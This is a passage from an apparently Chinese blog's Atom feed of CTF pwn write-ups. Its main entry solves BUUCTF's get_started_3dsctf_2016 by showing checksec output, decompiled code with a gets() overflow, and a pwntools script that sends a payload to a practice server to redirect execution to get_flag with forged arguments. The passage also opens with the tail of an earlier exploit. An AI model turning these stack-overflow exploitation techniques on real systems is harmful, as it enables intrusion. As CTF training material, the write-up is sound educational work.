class="number">0x4006E6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;bjdctf-2020-babystack&quot;&gt;&lt;a href=&quot;#bjdctf-2020-babystack&quot; class=&quot;headerlink&quot; title=&quot;bjdctf_2020_babystack&quot;&gt;&lt;/a&gt;bjdctf_2020_babystack&lt;/</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-get_started_3dsctf_2016</title>
    <link href="http://example.com/2022/01/14/buuctf-get-started-3dsctf-2016/"/>
    <id>http://example.com/2022/01/14/buuctf-get-started-3dsctf-2016/</id>
    <published>2022-01-14T12:43:29.000Z</published>
    <updated>2022-01-14T12:44:21.261Z</updated>
    
    <content type="html"><![CDATA[<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>常看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO<span class="comment">//没开</span></span><br><span class="line">Stack:    No canary found<span class="comment">//没开</span></span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span> <span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure><p>看main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4);</span><br><span class="line">  gets(&amp;v4);<span class="comment">//漏洞点</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x308CD64F</span> &amp;&amp; a2 == <span class="number">0x195719D1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v4 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">char</span>)v4;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v5);</span><br><span class="line">        v6 = getc(v3);</span><br><span class="line">        v5 = (<span class="keyword">char</span>)v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要满足条件就读取flag.txt</p><p>那个时候我一直在想怎么弄,直接返回函数是怎么传参,怎么才能保护栈的空间奔溃</p><p>大概就是这么布局：’a’*offset + ‘ebp’ + get_flag + get_flag的返回地址 + 参数1 + 参数2</p><p>不过发现要有什么限制，必须维护好栈，所以地找一个函数来退出。于是利用了exit函数(这个意思是接受数据的时候,要让他正常退出,不然的话不会返回数据)</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&quot;./get_started_3dsctf_2016&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27997</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># 0x0804E6A0为exit地址</span></span><br><span class="line">flag_addr=<span class="number">0x080489A0</span></span><br><span class="line">exit_addr=<span class="number">0x0804E6A0</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p32(flag_addr)+p32(exit_addr)</span><br><span class="line"><span class="comment">#后面俩个对应的是函数参数</span></span><br><span class="line">payload+=p32(<span class="number">0x308CD64F</span>)+p32(<span class="number">0x195719D1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>小结:</p><p>还有一种办法！等有时间的时候补充一下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;get-started-3dsctf-2016&quot;&gt;&lt;a href=&quot;#get-started-3dsctf-2016&quot; class=&quot;headerlink&quot; title=&quot;get_started_3dsctf_2016&quot;&gt;&lt;/a&gt;get_started_3dsct</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
</feed>
